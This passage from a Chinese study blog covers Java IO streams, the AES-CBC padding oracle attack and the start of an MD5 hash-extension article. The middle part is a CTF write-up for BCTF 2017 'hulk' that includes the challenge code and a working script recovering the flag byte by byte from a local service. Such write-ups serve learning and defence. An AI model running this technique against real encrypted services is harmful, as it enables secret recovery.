<span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> pipedInputStream.read();</span><br><span class="line">                        System.out.println(<span class="string">&quot;pipedInputStream.read &quot;</span> + (<span class="type">char</span>) data);</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    System.out.println(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2
id="objectinputstreamobjectoutputstream">ObjectInputStream/ObjectOutputStream</h2>
<ul>
<li><p>被序列化的对象的类要实现接口
<strong>Serializable</strong>。</p></li>
<li><p>静态属性无法被序列化和反序列化。</p></li>
<li><p>可以使用关键字 <strong>transient</strong>
标记不想被序列化的成员变量。</p></li>
<li><p>序列化到文件后不用 <strong>flush()</strong>
操作，同字节流一样也不存在缓冲区。</p></li>
<li><p>反序列化后的对象是 <strong>Object</strong>
类型，如果需要使用原对象的属性或方法，需要进行强制类型转化。</p></li>
<li><p>对象在序列化和反序列化的过程中，抛出的不只有
<strong>IOException</strong> 异常。</p></li>
<li><p><strong>serialVersionUID</strong> 机制</p>
<blockquote>
<p>当实现 <strong>Serializable</strong> 接口的类没有显式地定义一个
<strong>serialVersionUID</strong> 变量时，<strong>Java</strong>
的序列化机制会自动生成一个
<strong>serialVersionUID</strong>，写入到序列化文件中，用来验证版本一致性。</p>
<p>如果两个版本一致，在没有发生成员变量<strong>类型变更</strong>的情况下都可以正常转化。</p>
<p>如果两个版本不一致，则会直接报错。</p>
</blockquote></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;南溟&quot;</span>, <span class="number">18</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/tmp/out.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file));</span><br><span class="line">        oos.writeObject(stu);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file));</span><br><span class="line">        <span class="type">Student</span> <span class="variable">newStu</span> <span class="operator">=</span> (Student) ois.readObject();</span><br><span class="line">        System.out.println(newStu.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String Name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> Age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">transient</span> <span class="type">int</span> Sex;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String ClassName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">123123612836L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">int</span> sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.Name = name;</span><br><span class="line">        <span class="built_in">this</span>.Age = age;</span><br><span class="line">        <span class="built_in">this</span>.Sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;Name=&#x27;&quot;</span> + Name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, Age=&quot;</span> + Age +</span><br><span class="line">                <span class="string">&quot;, Sex=&quot;</span> + Sex +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sequenceinputstream">SequenceInputStream</h2>
<p>构造参数可以是两个
<strong>InputStream</strong>，或者是一个迭代器。</p>
<p>读取完成之前，不可以关闭被组合的流，否则会抛出异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">input1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/tmp/out1.txt&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">input2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/tmp/out2.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SequenceInputStream</span> <span class="variable">sequenceInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SequenceInputStream</span>(input1, input2);</span><br><span class="line">        <span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> sequenceInputStream.read();</span><br><span class="line">        <span class="keyword">while</span> (data != -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.print(data + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            data = sequenceInputStream.read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 115 111 117 116 104 10 99 97 116 10 </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2
id="filterinputstreamfilteroutputstream">FilterInputStream/FilterOutputStream</h2>
<p><strong>FilterInputStream/FilterOutputStream</strong> 也属于一种
<strong>InputStream/OutputStream</strong>，它的作用是为<strong>装饰器</strong>类提供基类。其中，<strong>装饰器</strong>类可以把属性或有用的接口与输入流连接在一起。</p>
<h3
id="datainputstreamdataoutputstream">DataInputStream/DataOutputStream</h3>
<p>一旦要使用 <strong>readLine()</strong>，就不应该用
<strong>DataInputStream</strong>
【否则，编译时会得到使用了过时方法的警告】，而应该使用
<strong>BufferedReader</strong>。除了这种情况之外的情形中，<strong>DataInputStream</strong>
仍是 <strong>IO</strong> 类库的首选成员。是对
<strong>InputStream</strong> 的拓展。</p>
<h3
id="bufferedinputstreambufferedoutputstream">BufferedInputStream/BufferedOutputStream</h3>
<p>为输入流提供缓冲，可以加快 <strong>IO</strong> 的速度。
<strong>BufferedInputStream</strong>
不是一次从网络或磁盘读取一个字节，而是一次将更大的块读入内部缓冲区。当从
<strong>BufferedInputStream</strong>
读取一个字节时，从其内部缓冲区中读取一个字节。当缓冲区被完全读取时，将另一个更大的数据块读入缓冲区。比从
<strong>InputStream</strong>
一次读取单个字节快得多，特别是对于磁盘访问和更大的数据量。</p>
<p>最好使用 <strong>1024</strong>
字节倍数的缓冲区大小，最适合硬盘中的大多数内置缓冲等。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">input1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/tmp/out.txt&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">bufferSize</span> <span class="operator">=</span> <span class="number">8</span> * <span class="number">1024</span>;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">input2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/tmp/out.txt&quot;</span>), bufferSize);</span><br></pre></td></tr></table></figure>
<p><strong>BufferedOutputStream</strong> 在绝对确定数据写出后，才可调用
<strong>flush()</strong> 清空缓冲区。</p>
<h3 id="pushbackinputstream">PushbackInputStream</h3>
<p>允许先读取几个字节查看内容，来决定做什么，然后再重新从头读取。</p>
<p>流本身不支持回退功能，<strong>PushBackInputStream</strong>
内部维护了一个 <strong>byte</strong> 数组来实现推回操作的。</p>
<p>通常作为编译器的扫描器，一般情况下不会用到。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">pushbackLimit</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"><span class="type">PushbackInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PushbackInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/tmp/out.txt&quot;</span>), pushbackLimit);</span><br></pre></td></tr></table></figure>
<h3 id="printstream">PrintStream</h3>
<p>目的就是为了以可视化格式打印所有基本数据类型。</p>
<p>它捕获了所有的 <strong>IOException</strong>，因此，我们必须使用
<strong>checkError()</strong> 自行测试错误状态。</p>
<p>可以用 <strong>boolean</strong> 值指示是否每次换行时清空缓冲区。</p>
<h3 id="linenumberinputstream">LineNumberInputStream</h3>
<p>跟踪输入流中的行号，可调用 <strong>getLineNumber()</strong> 和
<strong>setLineNumber(int)</strong>。</p>
<h3 id="refer">Refer</h3>
<p><a href="https://github.com/LingCoder/OnJava8">《On Java
8》中文版</a></p>
<p><a href="https://www.cnblogs.com/czwbig/p/10007201.html">系统学习
Java IO ---- 目录，概览</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析 Padding Oracle Attack</title>
    <url>/Study-Padding-Oracle/</url>
    <content><![CDATA[<h3 id="前言">前言</h3>
<p>在<strong>AES</strong>加密算法中分有<strong>AES-128</strong>、<strong>AES-192</strong>、<strong>AES-256</strong>，而每种对加密数据的分块长度又各有要求，分别为<strong>16byte</strong>【<strong>128</strong>位、<strong>24byte</strong>【<strong>192</strong>位和<strong>32byte</strong>【<strong>256</strong>位。</p>
<p>在<strong>AES</strong>加密的<strong>CBC</strong>模式中，若加密数据的长度模除分块长度而有余，则会在末尾填充一组数据。</p>
<p>即**(pad_length-len(data)%pad_length)*hex(pad_length-len(data)%pad_length)**。</p>
<p>若模除后为零，则直接填充一组如上公式所示的数据。</p>
<span id="more"></span>
<h4 id="举例">举例</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据：</span><br><span class="line">south</span><br><span class="line">补齐后的数据：</span><br><span class="line">south/x13/x13/x13/x13/x13/x13/x13/x13/x13/x13/x13</span><br><span class="line">数据：</span><br><span class="line">southseast</span><br><span class="line">补齐后的数据：</span><br><span class="line">southseast/x06/x06/x06/x06/x06/x06</span><br><span class="line">数据：</span><br><span class="line">southseastisacat</span><br><span class="line">补齐后的数据：</span><br><span class="line">southseastisacat/x10/x10/x10/x10/x10/x10/x10/x10/x10/x10/x10/x10/x10/x10/x10/x10</span><br></pre></td></tr></table></figure>
<h3 id="加密">加密</h3>
<figure>
<img src="/images/Study-Padding-Oracle/CBC_Encryption.png"
alt="CBC_Encryption.png" />
<figcaption aria-hidden="true">CBC_Encryption.png</figcaption>
</figure>
<p>首先是对明文分组，根据选择的模式所要求的分组长度来分组，填充数据块。</p>
<p>接着初始化一个<strong>IV</strong>【初始向量和<strong>Key</strong>【秘钥。</p>
<p>再将第一组明文和<strong>IV</strong>异或，后同<strong>Key</strong>进行块加密。</p>
<p>然后将得到的密文作为下一组明文进行快加密前的<strong>IV</strong>用来异或。</p>
<p>如此反复，最后拼接所有密文和<strong>IV</strong>。</p>
<h3 id="解密">解密</h3>
<figure>
<img src="/images/Study-Padding-Oracle/CBC_Decryption.png"
alt="CBC_Decryption.png" />
<figcaption aria-hidden="true">CBC_Decryption.png</figcaption>
</figure>
<p>首先是从密文中截取出<strong>IV</strong>【一般是拼接在头尾。</p>
<p>然后对密文分组，将第一组密文先同秘钥进行解密。</p>
<p>接着和<strong>IV</strong>异或得到明文，第二组的密文解密后同上一组的密文异或得到明文。</p>
<p>如此反复到最后一组，得到明文后判断最后填充的数据是否符合**(pad_length-len(data)%pad_length)*hex(pad_length-len(data)%pad_length)<strong>，若不对，即</strong>Padding**错误，抛出异常。</p>
<h3 id="关于padding-oracle">关于Padding Oracle</h3>
<p>在<strong>CBC</strong>模式中，<strong>IV</strong>是不要求保密的，故对于攻击者而言，可以获取到的数据有<strong>IV</strong>和密文。</p>
<p>在确定了加密模式后，提取<strong>IV</strong>，并分组密文，然后构造另一组<strong>IV</strong>拼接密文发回服务器来对其进行爆破。</p>
<h4 id="举例-1">举例</h4>
<p>此处选择了<strong>AES-128</strong>作为例子，明文长度为<strong>17</strong>位，故补齐至<strong>32</strong>位后分<strong>2</strong>组进行加密。</p>
<p>后伪造一组<strong>IV</strong>来和第一组密文一起发回服务器，让其进行判定。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明文：</span><br><span class="line">southseastisacat!</span><br><span class="line">IV：</span><br><span class="line">\x31\x32\x33\x34\x35\x36\x37\x38\x38\x37\x36\x35\x34\x33\x32\x31</span><br><span class="line">密文：</span><br><span class="line">\xbf\x61\xb3\x1b\xd3\x6a\x47\x11\xb9\xcc\xd7\x11\x7b\x8a\x42\xd9\x3a\x1e\x37\xe9\xd2\xde\xfa\xca\xa2\x50\xfd\xc0\x6e\xf2\x11\xc1</span><br></pre></td></tr></table></figure>
<p>对最后一位字符进行爆破，构造<strong>0x00</strong>到<strong>0xff</strong>，使得第一组密文的最后一个字节解密的结果同IV异或结果为<strong>0x01</strong>，导致<strong>Padding</strong>通过，服务器返回正确结果。</p>
<p>这时<strong>IV</strong>的最后一个字节和原<strong>IV</strong>的最后一个字节还有<strong>0x01</strong>异或，即<strong>0x44^0x31^0x01</strong>，得到结果为<strong>t</strong>，是第一组明文的最后一个字符。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一组密文：</span><br><span class="line">\xbf\x61\xb3\x1b\xd3\x6a\x47\x11\xb9\xcc\xd7\x11\x7b\x8a\x42\xd9</span><br><span class="line">IV：</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44</span><br></pre></td></tr></table></figure>
<p>这个就是逆推的公式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">∵</span><br><span class="line">decryp(cipher) ^ iv = plain</span><br><span class="line">decryp(cipher) ^ fake_iv = new_plain </span><br><span class="line">new_plain[-1:] = 0x01</span><br><span class="line">∴</span><br><span class="line">fake_iv[:-1] ^ iv[:-1] ^ plain[:-1] = 0x01</span><br></pre></td></tr></table></figure>
<h3 id="例题">例题</h3>
<h4 id="hulk">hulk</h4>
<p>这是<strong>BCTF 2017</strong>的一道题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Unbuffered</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream</span>):</span><br><span class="line">       self.stream = stream</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, data</span>):</span><br><span class="line">       self.stream.write(data)</span><br><span class="line">       self.stream.flush()</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, attr</span>):</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">getattr</span>(self.stream, attr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> mycryptolib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2charlist</span>(<span class="params">hexstr</span>):</span><br><span class="line">    charlist = []</span><br><span class="line">    length = <span class="built_in">len</span>(hexstr)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        hexstr = <span class="string">&#x27;0&#x27;</span> + hexstr</span><br><span class="line">        length += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, <span class="number">2</span>):</span><br><span class="line">        charlist.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(hexstr[i]+hexstr[i+<span class="number">1</span>], <span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> charlist</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pattern = <span class="string">&#x27;\A[0-9a-fA-F]+\Z&#x27;</span></span><br><span class="line">    request1 = raw_input(<span class="string">&#x27;Give me the first hex vaule to encrypt: 0x&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(request1) &gt; <span class="number">96</span> <span class="keyword">or</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(pattern, request1):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;invalid input, bye!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    plaintext1 = <span class="string">&quot;&quot;</span>.join(item <span class="keyword">for</span> item <span class="keyword">in</span> hex2charlist(request1)) + flag</span><br><span class="line">    ciphertext1 = encrypt(plaintext1, refresh_key = <span class="literal">True</span>)</span><br><span class="line">    plaintext1_str = request1+<span class="string">&#x27;|flag&#x27;</span></span><br><span class="line">    ciphertext1_str = ciphertext1.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;plaintext: 0x%s\nciphertext: 0x%s&#x27;</span> % (plaintext1_str, ciphertext1_str)</span><br><span class="line">    </span><br><span class="line">    request2 = raw_input(<span class="string">&#x27;Give me the second hex vaule to encrypt: 0x&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(request2) &gt; <span class="number">96</span> <span class="keyword">or</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(pattern, request2):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;invalid input, bye!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    plaintext2 = <span class="string">&quot;&quot;</span>.join(item <span class="keyword">for</span> item <span class="keyword">in</span> hex2charlist(request2))</span><br><span class="line">    ciphertext2 = encrypt(plaintext2, iv_p = <span class="built_in">str</span>(ciphertext1[-<span class="number">16</span>:]), refresh_key = <span class="literal">False</span>)</span><br><span class="line">    plaintext2_str = request2</span><br><span class="line">    ciphertext2_str = ciphertext2.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;plaintext: 0x%s\nciphertext: 0x%s&#x27;</span> % (plaintext2_str, ciphertext2_str)</span><br></pre></td></tr></table></figure>
<p>源码中，在对第二次获取到的明文加密时，使用的<strong>IV</strong>是第一次密文的后十六个字节，故推出这是一个<strong>AES-128</strong>加密，分组长度为<strong>16</strong>比特。</p>
<p>此中，密文采用了<strong>ASCII</strong>十六进制的表示方法，即两个字符表示一个字节的十六进制数，这是因为密码学算法中得到的密文经常会出现不可打印字符。因此<strong>16</strong>个字节加密后得到的会是<strong>32</strong>字节的密文长度。</p>
<p>测试了一下，在输入数据的字节数从<strong>9</strong>字节增长到<strong>10</strong>字节的时候，密文长度增加了<strong>16x2</strong>，因此根据前文，当明文模除分组长度【<strong>16</strong>为<strong>0</strong>时填充一个<strong>16x/0x10</strong>的<strong>Padding</strong>，推测出<strong>flag</strong>的长度为<strong>38</strong>字节，填充后分组加密，密文长度为<strong>48</strong>字节。</p>
<h5 id="举例-2">举例</h5>
<p>爆破得出<strong>flag</strong>的第<strong>1</strong>字节。</p>
<p>构造第一次输入的<strong>Payload</strong>长度需为<strong>47</strong>字节，拼接<strong>flag</strong>后，明文长度共计<strong>85</strong>字节，共分六组。</p>
<p>其中由于拼接明文和<strong>flag</strong>，因此第<strong>48</strong>字节为<strong>flag</strong>的第一字节，分组后位于密文的第三组最后一位，将第二组密文作为<strong>IV</strong>异或后加密。</p>
<p>而第二次输入的明文和第一次加密的第六组密文异或后加密。</p>
<p>所以如果第一次输入的第三组和第二次输入的第一组的<strong>IV</strong>与明文的异或结果一样，密钥也一样，那么其加密后的密文也就一样。</p>
<p>则此处可以爆破构造输入，已知<strong>IV</strong>，可以通过爆破明文的方式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一次输入的第三组加密</span><br><span class="line">fir_iv = fir_cipher[2]</span><br><span class="line">encryp(fir_plain[3] ^ fir_iv) = fir_cipher[3]</span><br><span class="line"># 第二次输入的第一组加密</span><br><span class="line">sec_iv = fir_cipher[6]</span><br><span class="line">encryp(sec_plain[1] ^ sec_iv) = sec_cipher[1]</span><br><span class="line"># 联立等式，第三组明文前十五字节已知，需要爆破fir_plain[3]最后一个字节。</span><br><span class="line">fir_plain[3] ^ fir_cipher[2] ^ fir_cipher[6] = sec_plain[1]</span><br></pre></td></tr></table></figure>
<p>然后，使得<strong>fir_cipher[3]==sec_cipher[1]</strong>的最后一个字节就是<strong>flag</strong>的第一个字节。</p>
<p>最后构造<strong>payload</strong>长度为<strong>46</strong>字节，引入后面拼接的<strong>flag</strong>的两个字节到第三分组，此时已知<strong>flag</strong>的第一个字节，那么继续爆破第二个字节即可，以此类推，脚本借鉴自<a
href="https://www.xctf.org.cn/library/details/4603ec7f0031408acca073b80edb63744f92bacb/"><strong>Nu1L</strong></a>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">target = (<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">step = <span class="number">32</span></span><br><span class="line">dic = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">cipher_2, cipher_6, payload</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher_2[i]) ^ <span class="built_in">ord</span>(cipher_6[i]) ^ <span class="built_in">ord</span>(payload[i])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">i, part_flag</span>):</span><br><span class="line">    io = zio(target, timeout=<span class="number">5</span>, print_read=COLORED(NONE, <span class="string">&#x27;red&#x27;</span>), print_write=COLORED(NONE, <span class="string">&#x27;green&#x27;</span>))</span><br><span class="line">    io.read_until(<span class="string">&#x27;encrypt: 0x&#x27;</span>)</span><br><span class="line">    <span class="comment"># 构造第一次输入明文，用于逐字节引入flag进行爆破。</span></span><br><span class="line">    fir_plain = (<span class="string">&#x27;a&#x27;</span> * (<span class="number">48</span> - i)).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    io.writeline(fir_plain)</span><br><span class="line">    io.read_until(<span class="string">&#x27;ciphertext: 0x&#x27;</span>)</span><br><span class="line">    <span class="comment"># 截取密文。</span></span><br><span class="line">    fir_cipher = io.read_line()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 分组密文。</span></span><br><span class="line">    fir_cipher = [fir_cipher[j:j + step] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fir_cipher), step)]</span><br><span class="line">    <span class="comment"># 构造第二次输入明文，用于爆破最后一字节flag。</span></span><br><span class="line">    payload = (<span class="string">&#x27;a&#x27;</span> * (<span class="number">39</span> - <span class="built_in">len</span>(flag + part_flag)) + flag + part_flag)[-<span class="number">16</span>:]</span><br><span class="line">    <span class="comment"># 异或</span></span><br><span class="line">    sec_plain = xor(fir_cipher[<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>), fir_cipher[-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>), payload).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    io.read_until(<span class="string">&#x27;encrypt: 0x&#x27;</span>)</span><br><span class="line">    io.writeline(sec_plain)</span><br><span class="line">    io.read_until(<span class="string">&#x27;ciphertext: 0x&#x27;</span>)</span><br><span class="line">    sec_cipher = io.read_line()[:<span class="number">32</span>]</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> fir_cipher[<span class="number">2</span>] == sec_cipher <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">39</span>):</span><br><span class="line">    <span class="keyword">for</span> part_flag <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> get_flag(i, part_flag):</span><br><span class="line">            flag += part_flag</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % flag)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="refer">Refer</h3>
<p><a href="https://www.freebuf.com/articles/web/15504.html">我对Padding
Oracle攻击的分析和思考（详细）</a></p>
<p><a href="https://www.jianshu.com/p/ad8bdd87e131">Web狗要懂的Padding
Oracle攻击</a></p>
<p><a
href="https://www.jianshu.com/p/1851f778e579?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">Padding
Oracle</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>初探MD5原理及哈希拓展攻击</title>
    <url>/Study-MD5/</url>
    <content><![CDATA[<p>学点密码学。</p>
<span id="more"></span>
<h3 id="前言">前言</h3>
<p><strong>MD5</strong>消息摘要算法一种被广泛使用的密码散列函数，输入长度小于<strong>2^64</strong>【<strong>18446744073709551616</strong>位的消息，输出一个<strong>128</strong>位【<strong>16Byte</strong>的散列值，输入信息以<strong>512</strong>位一组的分组为单位处理。一般<strong>128</strong>位的<strong>MD5</strong>散列被表示为<strong>32</strong>个字符的十六进制数字。</p>
<h3 id="原理">原理</h3>
<h4 id="末尾填充">末尾填充</h4>
<p>首先是对原文求余，判断原文位数模除<strong>512</strong>的结果是否为<strong>448</strong>。</p>
<p>若不满足以上条件，则对其进行填充，第一位填充<strong>1</strong>，剩余位数填充<strong>0</strong>，直到满足最后结果长度模除<strong>512</strong>的值为<strong>448</strong>，若取余结果大于<strong>448</strong>，则再填充一组<strong>512</strong>长度的值。</p>
<p>需要注意的是，这边填充的内容是小端序，如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 &gt; 00 00 00 01 &gt; 01 00 00 00 &gt; 0x80</span><br></pre></td></tr></table></figure>
<p>因此在<strong>Python</strong>中填充第一位的内容为<strong></strong>，实现代码如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;south&quot;</span></span><br><span class="line"><span class="comment"># 分组长度为512位，即64</span></span><br><span class="line">group_length = <span class="number">64</span></span><br><span class="line"><span class="comment"># 余数长度为448位，即56</span></span><br><span class="line">remainder = <span class="number">56</span></span><br><span class="line">distance = <span class="built_in">len</span>(message) % group_length</span><br><span class="line">message = message.encode()</span><br><span class="line">message += <span class="string">b&quot;\x80&quot;</span></span><br><span class="line"><span class="keyword">if</span> distance &gt; remainder:</span><br><span class="line">    message += <span class="string">b&quot;\x00&quot;</span> * (group_length + remainder - distance - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    message += <span 